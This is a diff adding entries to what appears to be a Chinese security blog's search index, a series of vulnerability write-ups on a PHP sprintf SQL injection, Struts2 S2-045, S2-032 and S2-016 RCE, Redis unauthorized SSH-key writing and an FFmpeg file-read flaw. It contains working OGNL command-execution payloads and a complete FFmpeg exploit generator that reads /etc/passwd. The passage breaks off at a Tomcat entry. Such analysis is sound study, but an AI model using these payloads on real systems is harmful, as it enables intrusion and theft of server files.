@@ -1,6 +1,133 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[由一次CTF引发的学习笔记之PHP的sprintf函数]]></title>
+    <url>%2F2018%2F06%2F19%2F%E7%94%B1%E4%B8%80%E6%AC%A1CTF%E5%BC%95%E5%8F%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BPHP%E7%9A%84sprintf%E5%87%BD%E6%95%B0%2F</url>
+    <content type="text"><![CDATA[0x01 前言周末打了一次LCTF，感觉这次题目出的好难，其中做了Simple blog题的时候，发现了一个神奇的知识点：用php的sprintf函数来绕过mysql_real_escape_string()函数进行sql注入。 PS.在写这篇文章的时候发现都php源码的重要性，在看seebug的文章的时候，发现其对sprintf的$符号的用法一笔带过，对于初学者来说根本无法理解这个符号在sprintf中的作用，幸亏那篇文章有php源码的链接，自己看了看才懂得$符号究竟的用来干什么的，感叹一下果然文档不是万能的，自己读源码才是王道啊。 0x02 赛题复现这道题最先是一个padding oracle，写脚本跑出来token后就可以进入admin.php了，这里给一下admin.php的代码12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);session_start();include(&apos;config.php&apos;);if(!$_SESSION[&apos;isadmin&apos;])&#123; die(&apos;You are not admin&apos;);&#125;if(isset($_GET[&apos;id&apos;]))&#123; $id = mysql_real_escape_string($_GET[&apos;id&apos;]); if(isset($_GET[&apos;title&apos;]))&#123; $title = mysql_real_escape_string($_GET[&apos;title&apos;]); $title = sprintf(&quot;AND title=&apos;%s&apos;&quot;, $title); &#125;else&#123; $title = &apos;&apos;; &#125; $sql = sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; $title&quot;, $id); $result = mysql_query($sql,$con); $row = mysql_fetch_array($result); if(isset($row[&apos;title&apos;])&amp;&amp;isset($row[&apos;content&apos;]))&#123; echo &quot;&lt;h1&gt;&quot;.$row[&apos;title&apos;].&quot;&lt;/h1&gt;&lt;br&gt;&quot;.$row[&apos;content&apos;]; die(); &#125;else&#123; die(&quot;This article does not exist.&quot;); &#125;&#125;?&gt; 通过之前得到的token可以绕过第一个if判断，然后往下看推测是一个注入。这里id和title两个参数是我们可控的，但是都用了mysql_real_escape_string()进行转移了，先来看一下mysql_real_escape_string()的功能 因此，正常情况下想要注入的话几乎是不可能的。但是，这里有个奇特之处在于使用了两个sprintf函数进行拼接，并且第一个sprintf后的结果拼接到了第二个sprintf里面。这里利用了sprintf的一个小特性可以逃逸单引号，具体原理之后说，我们先来看看结果如何 可以看到当and 1=1的时候返回正常，当and 1=2的时候返回错误，因此可以注入！ 0x03 漏洞原理这里我们利用了sprintf的一个padding功能，是的单引号被吃掉了，可以看到php文档中有一个例子如下： 这里的用法就是在格式化字符串中，单引号后面的字符代表着用该字符去进行填充，那么如果能够提前输入1%&apos; and 1=1# 如果存在addslashes或者mysql_real_escape_string等之类的过滤，把单引号进行了转义，变成\’，那么其中的反斜杠会被sprintf认为是填充的字符，从而吃掉了反斜杠，达到单引号逃逸的目的。 但是在这道题中，如果用1%&apos; and 1=1# 这个的话还是不好用，因为这种方式容易遇到PHP Warning: sprintf(): Too few arguments的报错。 因此还需要sprintf的另一个trick。 如上图，文档中还有一个例子，其中%后面的数字代表着第几个参数，$符号在这里的作用是中止符，用来检测前面有几个数字的，而$符号后面的字母代表着参数类型，s表示stirng类型，因此可以构造1%1$&apos;%s&apos; 这里的意思就是，第一个参数，用%进行填充，类型为stirng，那么最后刚好剩余了一个单引号，成功逃逸！因此，第一个id参数就要输入正常的，在title参数时输入%1$’%即可。在这道题里就是12id=3title=This is admin page%1$&apos; and 1=1# ok，成功！ 0x04 参考https://paper.seebug.org/386/https://github.com/php/php-src/blob/c8aa6f3a9a3d2c114d0c5e0c9fdd0a465dbb54a5/ext/standard/formatted_print.c]]></content>
+      <categories>
+        <category>PHP安全</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[S2-045远程代码执行漏洞分析]]></title>
+    <url>%2F2018%2F06%2F19%2FS2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[0x01 前言最近在学习java安全，第一个目标就是Struts了，准备找一些比较典型的Struts漏洞进行一系列的分析。 0x02 漏洞分析 首先看下官方文档的描述 发现是在Content-Type处写入恶意的代码来进行代码执行的，然后选择下载Struts 2.3.31和Struts 2.3.32两个版本进行对比研究 丢进Beyond Compare中看一看发现dispatcher.multipart包中的三个java文件有不同，我们可以看到Jakarta字样，Jakarta是Struts2默认的上传处理配置，因此我们可以知道应该是要模拟上传行为来触发漏洞。 点开这三个java文件，我们可以发现其实修复的处理都是一样的 总结一下就是把1LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args); 这里的e.getMessage()换成了null，所以我们推测应该是报错信息出现的问题把。我们直接本地搭建一个上传点，然后开burp拦截，启动debug模式，在上面的地方下断点，进行调试看看，因为需要报错信息才能触发漏洞，所以我就直接在Content-Type处直接加了个123，解析肯定会报错的 这里有一个小技巧就是我们把这个上传包send to repeat一下，这样之后重新调试的时候直接go一下就可以了，不用每次都抓包，很麻烦。 然后我们Go一下，程序会停在断点处 然后我们单步进入 发现之前findText处的e.getMessage()处变成了defaultMessage，并且看一下监视器，发现这个变量前面是固定报错信息，但是后面拼接了我们出入的Content-Type字段的数据。 这个时候还不明朗，继续往下走，进入findText函数内部 其实这里我发现一点，那就是官方文档中已经说明了findText方法的作用，大致意思就是：如果Content-Type解析错误了，那么他就要找到指定的aTextName变量的本地化消息，如果在aClass变量指定的包中没有找到，就继续在上一个包中找，一直循环，直到obj包。并且有一点就是，官方文档明确说明了错误信息会被当作ognl表达式在解析 先记着吧，我们继续往下看。 往下走发现有一个findMessage函数，进去看看 发现就是并没有什么用，都是返回的null 之后到了下面有一个循环这个循环就是之前说的那个在aClass变量执行的包中找，如果找不到就在上一个包中找，发现他会一直到obj包中都还没有找到 继续走，发现了一个敏感函数，getDefaultMessage。因为我们之前是直到的，defaultMessage变量是我们可控的，进去看一下 找的了！之前分析S2-016的时候我们直到在translateVariables函数中是可以执行ognl表达式的，看一下这里的message参数， 刚好是我们们出入的defaultMessage，可控！ 继续进入后，看到 那么payload的写法还是%{}或者${} 最后进入到执行ognl表达式的函数中就会发现他是只执行${xxx}或者%{xxx}中的xxx的，所以并不用担心defaultMessage中系统自带的那些报错信息 0x03 exp编写回溯buildErrorMessage函数,发现其在parse函数执行回溯parse函数，发现其在MultiPartRequestWrapper函数中执行回溯MultiPartRequestWrapper函数，发现其在dispatcher.wrapRequest函数中执行但是我们发现，在获取Content-Type之后，有一个if判断，就是说Content-Type中必须得有multipart/form-data，才会执行之后的函数，所以编写exp的时候必须要有multipart/form-data字符串才行。 再回溯到了PrepareOperations.wrapRequest再回溯到了StrutsPrepareAndExecuteFilter.doFilter 1%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 0x04 总结 Jarkata解析器是默认的文件上传解析器 core包中的struts-default.xml中存在类成员访问的黑名单功能]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>Struts2</tag>
+        <tag>远程代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[S2-032远程代码执行漏洞分析]]></title>
+    <url>%2F2018%2F06%2F19%2FS2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[0x01 前言最近在学习java安全，第一个目标就是Struts了，准备找一些比较典型的Struts漏洞进行一系列的分析。 0x02 漏洞分析 首先，看一下官方文档 看了一下发现是由于动态方法调用（DMI）所引起的远程代码执行，下载Struts 2.3.28和Struts 2.3.28.1进行代码分析 使用Beyond Compare比较一下两个版本的区别 排查了一下，发现在DefaultActionMapper.java中（又是这个。。） 进入代码，发现在对传入的方法名称的时候使用了cleanActionName方法进行过滤了 这个cleanActionName方法是新写的，主要是 如果方法名称不再这个pattern范围内，就不行。 既然这里存在问题，那么我就在此处下个断点，看看整个流程是如何的。 在运行代码之前，要在struts.xml中加一句 这个用来把动态方法调用开启。 看了一下DefaultActionMapper类的声明 跟之前S2-016的用法比较类似，使用?method:execute的方式调用execute方法（execute方法是struts2中默认的action调用方法，这里我本地搭建环境，为了方便就是用execute方法了） 开始访问url程序在断点处停止了，然后一直跟进当进入Dispatcher类中的serviceAction方法中的选择单步跳入 一直选择单步跳入，跳到 这里的话算对了。（对了就不要停！继续跟进！） 跳到DefaultActionProxy类中的DefaultActionProxy方法中，我们可以看到这个我们传入的方法被带入到escapeHtml4进行处理 在监视器中可以看到methodName确实是我们传入的execute 这里会进行html编码、转义操作。 之后就一直单步跳出，一直跟踪到Dispatcher类的proxy.exeute()的时候再单步进入 然后在invocation.invoke()处再次单步步入 之后看到我们有一个invocation.invoke()，这个是用来执行struts2的拦截器的，在这里步入 在这里有一处：1resultCode = interceptor.getInterceptor().intercept(DefaultActionInvocation.this); 此处是递归执行拦截器方法，会在这里执行多次，多点几下，然后到达下面的invokeActionOnly，进入 多次步入之后就会进入DefaultActionInvoke类中的invokeAction方法中，有一个ognlUtil.getValue方法，此处会将method的名字，也就是我们传入的，可控的传入进去，当做ognl表达式来执行。 这样我们就知道了在method:后面加上我们要执行的ognl表达式即可执行任意代码了。 0x03 exp编写1%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&amp;cmd=ls&amp;dd= &amp;d=____A&amp;encoding=UTF-8 这里需要注意的是之前我们分析的时候发现我们传入的参数会被html编码以及转义的操作，因此我们写payload的时候不能出现双引号或者单引号等等，因此这里用#parameters.cmd[0]来获取命令，并且使用`@org.apache.struts2.ServletActionContext@getResponse()`来获取response对象 0x04 总结 DefaultActionInvocation类中的intercept方法是用来执行拦截器的 Struts2的拦截器是递归调用的 拦截器中的代码执行顺序，在执行Action之前，与堆栈执行顺序一致；而在Action和Result之后，则是逆序执行 Action层面的四个方面分别是：拦截器、Action、PreResultListener、Result 在DefaultActionInvocation中的invokeAction，存在ognlUtil.getValue方法，可以执行ognl表达式 ognl获取response对象的方法： @ org.apache.struts2.ServletActionContext@getResponse() #context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;) #parameters.cmd[0]等价与request.getParameter(&#39;cmd&#39;)]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>Struts2</tag>
+        <tag>远程代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[S2-016远程代码执行漏洞分析]]></title>
+    <url>%2F2018%2F06%2F19%2FS2-016%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[0x01 前言最近在学习java安全，第一个目标就是Struts了，准备找一些比较典型的Struts漏洞进行一系列的分析。 0x02 漏洞分析 首先到Struts2的官方文档中找一下S2-016漏洞的文档 看文档主要是找到该漏洞的版本，由图可知，该漏洞发生在Struts2.0.0 - Struts2.3.15，并且在Struts 2.3.15.1中得到修复，那么我们就将Struts 2.3.15和Struts 2.3.15.3两个版本的源码下载下载 使用Beyond Compare工具进行对比，注意要把比较时间戳的选项去掉找了半天发现就一处不一样/core/src/main/java/org/apache/struts2/dispatcher/mapper/DefaultActionMapper.java 通过对比，发现 REDIRECT_PREFIX、REDIRECT_ACTION_PREFIX被删掉了 同时他们配套的put方法也被删掉了 还有一个就是action对应的put方法中添加了一个cleanActionName方法 看了一下官方文档给的poc 我选择在redirect配套的put方法中加断点，看看情况是如何的。在这里，有一个匿名类的用法，同时声明并执行了一个execute函数，看一下监视器中的变量发现这里传入的key是1redirect:%&#123;3*4&#125; 也就是我传入的参数，那么这部分就是用户可控的地方。继续往下走setLocation方法就是这是重定向的值，最后把用户输入的重定向的值设置为result，result的一般在struts.xml中可以用标签来设置的，这里是用1?redirect:xxx 来设置的。继续往下走，发现跳出了put方法发现到了DefaultActionMapper类中的handleSpecialParameters函数中（这里可以记下来，如果后续没有思路的话可以回溯往上再找找看），此处我选择继续往下跟进。多次step over和step into之后，发现跳到了StrutsPreparedAndExecuteFilter类的doFilter函数中，这个是Struts2的核心过滤器，每个请求都会到达这个类的这个函数中。step into execute.executeAction中看一下，其中该方法的参数，request和response没什么好说的，mapping是请求的参数，包括redierect的location、Action的名称、namespace等等，继续跟进发现进入Dispatcher类中 其中有一个result.execute，进去看看 发现进入了ServletRedirectResult类的execute方法，其中还要进入他的父类ServletResultSupport的execute方法继续跟进到conditionalParse方法中进入到了StrutsResultSupport类中的conditionalParse方法，其中我们看到了translateVariables方法，这个方法其实就是一个可以执行ognl表达式的方法，继续分析一下getStack()方法返回的就是OgnlValueStack，而param是%{3*4}刚好是我们输入的参数，满足参数可控，继续跟进进入到了TextParseUtil类中，我们看到第一个参数是1new char[]&#123;&apos;$&apos;,&apos;%&apos;&#125; 也就是说我们输入%{xxxx}或者${xxx}都可以执行之后我们进入translateVariables方法中 执行到parser.evaluate的时候跟进入，函数源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374public Object evaluate(char[] openChars, String expression, TextParseUtil.ParsedValueEvaluator evaluator, int maxLoopCount) &#123; // deal with the &quot;pure&quot; expressions first! //expression = expression.trim(); Object result = expression; int pos = 0; for (char open : openChars) &#123; int loopCount = 1; //this creates an implicit StringBuffer and shouldn&apos;t be used in the inner loop final String lookupChars = open + &quot;&#123;&quot;; while (true) &#123; int start = expression.indexOf(lookupChars, pos); if (start == -1) &#123; loopCount++; start = expression.indexOf(lookupChars); &#125; if (loopCount &gt; maxLoopCount) &#123; // translateVariables prevent infinite loop / expression recursive evaluation break; &#125; int length = expression.length(); int x = start + 2; int end; char c; int count = 1; //检查表达式中的格式是否是%&#123;&#125;或者$&#123;&#125;，‘&#123;’或者‘&#125;’不能多也不能少 while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123; c = expression.charAt(x++); if (c == &apos;&#123;&apos;) &#123; count++; &#125; else if (c == &apos;&#125;&apos;) &#123; count--; &#125; &#125; end = x - 1; if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123; String var = expression.substring(start + 2, end); //获取大括号中的内容 Object o = evaluator.evaluate(var);//执行了ognl表达式，返回结果 String left = expression.substring(0, start); String right = expression.substring(end + 1); String middle = null; if (o != null) &#123; middle = o.toString(); if (StringUtils.isEmpty(left)) &#123; result = o; &#125; else &#123; result = left.concat(middle); &#125; if (StringUtils.isNotEmpty(right)) &#123; result = result.toString().concat(right); &#125; expression = left.concat(middle).concat(right); &#125; else &#123; // the variable doesn&apos;t exist, so don&apos;t display anything expression = left.concat(right); result = expression; &#125; pos = (left != null &amp;&amp; left.length() &gt; 0 ? left.length() - 1: 0) + (middle != null &amp;&amp; middle.length() &gt; 0 ? middle.length() - 1: 0) + 1; pos = Math.max(pos, 1); &#125; else &#123; break; &#125; &#125; &#125; return result; &#125; 当执行到这里，再次进入 一路跟进，发现最后由Ognl类的getValue执行了ognl表达式 得到了结果12 0x03 exp编写1$&#123;#a=new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;netstat&quot;,&quot;-an&quot;&#125;).start().getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#screen=#context.get(&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;).getWriter(),#screen.println(#d),#screen.close()&#125; 注意要进行url编码 0x04 总结 translateVariable能够执行ognl表达式 org.apache.struts2.dispatcher.StrutsResultSupport类中的conditionalParse能够解析ognl表达式 所有的请求会到StrutsPreparedAndExecute类的doFilter中 exp中使用#content.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’).getWriter().printnln()来回显]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>Struts2</tag>
+        <tag>远程代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CVE-2017-16995 Ubuntu本地提权]]></title>
+    <url>%2F2018%2F06%2F19%2FCVE-2017-16995Ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%2F</url>
+    <content type="text"><![CDATA[0x01 漏洞信息几天前，圈子里疯传了ubuntu的本地提权，其主要是在twitter中用户用户 @Vitaly Nikolenko发布消息,并且还给了exp下载。 从上图可以看到，首先我们要下载之前的.c文件，然后使用gcc进行编译，然后用普通用户执行，即可提权。 受影响范围： Linux Kernel Version 4.14-4.4仅影响Ubuntu/Debian发行版本 0x02 防御措施 2.1 第一种方法在终端执行以下命令进行升级内核 1echo &quot;deb http://archive.ubuntu.com/ubuntu/xenial-proposed restricted main multiverse universe&quot; &gt; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt install linux-image-4.4.0-117-generic 2.2 第二种方法执行以下命令关闭bpf服务 1echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[zzcms v8.2 任意用户密码重置]]></title>
+    <url>%2F2018%2F06%2F19%2Fzzcms8-2%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%2F</url>
+    <content type="text"><![CDATA[0x01 漏洞概述本次zzcms8.2的漏洞是任意用户密码重置，需要事先注册一个账号用来做测试，同时在找回密码的地方也存在遍历用户的问题，那么就开始复现漏洞了。 0x02 漏洞复现首先，我注册了一个test／test用户，然后点击登录的忘记密码，即http://127.0.0.1/one/getpassword.php 通过这种方式，如果有一个强大的字典，即可遍历很多用户名了。 填写好了正确的用户名和验证码之后，进入第二步，按照正常流程，点击发送验证码，然后随便填写一个验证码，抓包后send repeat后进行go，然后看到相应包的结果，如图 我们可以看到在响应包中有一段js代码1window.document.userreg.yzm_mobile2.value=&apos;no&apos; 将其中的no改为yes，即1window.document.userreg.yzm_mobile2.value=&apos;yes&apos; 然后重新来一次，在第二步的时候，点击下一步之前在浏览器的console控制器中将修改后的js复制过去并执行 再次抓包 会发现这个之前没有的包，然后发现浏览器界面已经跳转到了第三步重置密码的界面了。 0x03 漏洞分析本次zzcms的任意密码重置漏洞网上有很多复现，但是都没有产生原因的分析，因此我通过抓包分析了出现的PHP文件后发现漏洞出现在ajax/ajax/yzm_check_ajax.php中 截图部分是所有的php代码，这里id的值就是输入的验证码，founderr用来判断验证码是否正确，如果等于1的话就是说验证码是错误的，如果是正确的话就会echo三个标签，仔细看的话这这个是我们之前在响应包中看到的那个带有no的js代码，而如果是正确的验证码的话就是yes，因此，这里应该是通过前端的代码来最终判断验证码是否正确，但是开发者却忽视了前端代码是我们可以控制的，因此可以绕过这里的验证码。]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>漏洞分析</tag>
+        <tag>ZZCMS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Redis未授权访问漏洞]]></title>
+    <url>%2F2018%2F06%2F19%2FRedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[0x01 漏洞简介Redis服务器默认绑定在0.0.0.0:6379，这会导致redis暴露在公网上，在未经过认证的情况下，任何人都可以进行登录。攻击者可以通过向redis上写入公钥，再利用私钥进行登录。 利用redis的config命令，可以向服务器上写文件，攻击者通过将自己的公钥写入到服务器的/root/.ssh文件夹下的authroized_key文件中，即可成功登录到目标服务器。 0x02 漏洞复现首先，生成自己的公钥和私钥1ssh-keygen -t rsa 会在/root/.ssh下生成id_rsa(私钥)、id_rsa.pub(公钥) 然后将公钥写入到一个txt中1(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; pino.txt 之后将该文件的内容通过redis的config命令写入到服务器上123456cat pino.txt|redis-cli -h 192.168.3.55 -x set pinoredis-cli -h 192.168.3.55&gt;config set dir /root/.ssh&gt;config set dbfilename &quot;authroized_keys&quot;&gt;save&gt;exit 到目前为止我们已经把自己的公钥上传到了服务器上了，这个时候就可以通过私钥来进行ssh登录了。 1ssh -i id_rsa root@192.168.3.55 就可以成功登录到服务器了。 0x03 遇到的问题及解决方案如果之前一切顺利后却发现最后一步ssh登录报错了，如下：sign_and_send_pubkey: signing failed: agent refused operation 可以通过12eval &quot;$(ssh-agent -s)&quot;ssh-add 解决 如果还有什么问题，欢迎私信交流～]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>Redis</tag>
+        <tag>未授权访问</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[FFMPEG 任意文件读取漏洞]]></title>
+    <url>%2F2018%2F06%2F19%2FFFMPEG%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[0x01 漏洞用途如果某场景使用ffmpeg版本小于3.2.4，并且有上传用户自定义avi视频的时候，利用该漏洞可以读取服务器上任意文件。 0x02制作特殊的avi脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#!/usr/bin/env python3import structimport argparseimport randomimport stringAVI_HEADER = b&quot;RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00&#125;\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00&#125;\x00\x00\x00\x86\x03\x00\x00\x10&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST movi&quot;ECHO_TEMPLATE = &quot;&quot;&quot;### echoing &#123;needed!r&#125;#EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x&#123;iv&#125;#EXTINF:1,#EXT-X-BYTERANGE: 16/dev/zero#EXT-X-KEY: METHOD=NONE&quot;&quot;&quot;# AES.new(&apos;\x00&apos;*16).decrypt(&apos;\x00&apos;*16)GAMMA = b&apos;\x14\x0f\x0f\x10\x11\xb5&quot;=yXw\x17\xff\xd9\xec:&apos;FULL_PLAYLIST = &quot;&quot;&quot;#EXTM3U#EXT-X-MEDIA-SEQUENCE:0&#123;content&#125;#### random string to prevent caching: &#123;rand&#125;#EXT-X-ENDLIST&quot;&quot;&quot;EXTERNAL_REFERENCE_PLAYLIST = &quot;&quot;&quot;#### External reference: reading &#123;size&#125; bytes from &#123;filename&#125; (offset &#123;offset&#125;)#EXTINF:1,#EXT-X-BYTERANGE: &#123;size&#125;@&#123;offset&#125;&#123;filename&#125;&quot;&quot;&quot;XBIN_HEADER = b&apos;XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00&apos;def echo_block(block): assert len(block) == 16 iv = &apos;&apos;.join(map(&apos;&#123;:02x&#125;&apos;.format, [x ^ y for (x, y) in zip(block, GAMMA)])) return ECHO_TEMPLATE.format(needed=block, iv=iv)def gen_xbin_sync(): seq = [] for i in range(60): if i % 2: seq.append(0) else: seq.append(128 + 64 - i - 1) for i in range(4, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) for i in range(12, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) return seqdef test_xbin_sync(seq): for start_ind in range(64): path = [start_ind] cur_ind = start_ind while cur_ind &lt; len(seq): if seq[cur_ind] == 0: cur_ind += 3 else: assert seq[cur_ind] &amp; (64 + 128) == 128 cur_ind += (seq[cur_ind] &amp; 63) + 3 path.append(cur_ind) assert cur_ind == len(seq), &quot;problem for path &#123;&#125;&quot;.format(path)def echo_seq(s): assert len(s) % 16 == 0 res = [] for i in range(0, len(s), 16): res.append(echo_block(s[i:i + 16])) return &apos;&apos;.join(res)test_xbin_sync(gen_xbin_sync())SYNC = echo_seq(gen_xbin_sync())def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3): content = b&apos;GAB2\x00\x02\x00&apos; + b&apos;\x00&apos; * 10 + playlist.encode(&apos;ascii&apos;) packet = b&apos;00tx&apos; + struct.pack(&apos;&lt;I&apos;, len(content)) + content dcpkt = b&apos;00dc&apos; + struct.pack(&apos;&lt;I&apos;, fake_packet_len) + b&apos;\x00&apos; * fake_packet_len return AVI_HEADER + packet + dcpkt * fake_packetsdef gen_xbin_packet_header(size): return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])def gen_xbin_packet_playlist(filename, offset, packet_size): result = [] while packet_size &gt; 0: packet_size -= 16 assert packet_size &gt; 0 part_size = min(packet_size, 64) packet_size -= part_size result.append(echo_block(gen_xbin_packet_header(part_size))) result.append( EXTERNAL_REFERENCE_PLAYLIST.format( size=part_size, offset=offset, filename=filename)) offset += part_size return &apos;&apos;.join(result), offsetdef gen_xbin_playlist(filename_to_read): pls = [echo_block(XBIN_HEADER)] next_delta = 5 for max_offs, filename in ( (5000, filename_to_read), (500, &quot;file:///dev/zero&quot;)): offset = 0 while offset &lt; max_offs: for _ in range(10): pls_part, new_offset = gen_xbin_packet_playlist( filename, offset, 0xf0 - next_delta) pls.append(pls_part) next_delta = 0 offset = new_offset pls.append(SYNC) return FULL_PLAYLIST.format(content=&apos;&apos;.join(pls), rand=&apos;&apos;.join( random.choice(string.ascii_lowercase) for i in range(30)))if __name__ == &quot;__main__&quot;: parser = argparse.ArgumentParser(&apos;AVI+M3U+XBIN ffmpeg exploit generator&apos;) parser.add_argument( &apos;filename&apos;, help=&apos;filename to be read from the server (prefix it with &quot;file://&quot;)&apos;) parser.add_argument(&apos;output_avi&apos;, help=&apos;where to save the avi&apos;) args = parser.parse_args() assert &apos;://&apos; in args.filename, &quot;ffmpeg needs explicit proto (forgot file://?)&quot; content = gen_xbin_playlist(args.filename) avi = make_playlist_avi(content) output_name = args.output_avi with open(output_name, &apos;wb&apos;) as f: f.write(avi) 使用命令1python3 gen_avi.py file:///etc/passwd poc.avi 获得poc.avi用来上传文件 0x03 漏洞复现首先复现环境使用pthithon的vulhub，项目地址https://github.com/vulhub/vulhub/tree/master/ffmpeg/phdays 12docker-compose builddocker-compose up -d 运行好环境后访问http://localhost:8080即可 这里是一个上传点，然后将之前构造好的上传文件上传后，提交，播放上传的视频即可获得/etc/passwd文件的内容]]></content>
+      <categories>
+        <category>漏洞分析与复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>FFMPEG</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CVE-2017-12615 Tomcat任意文件上传漏洞]]></title>
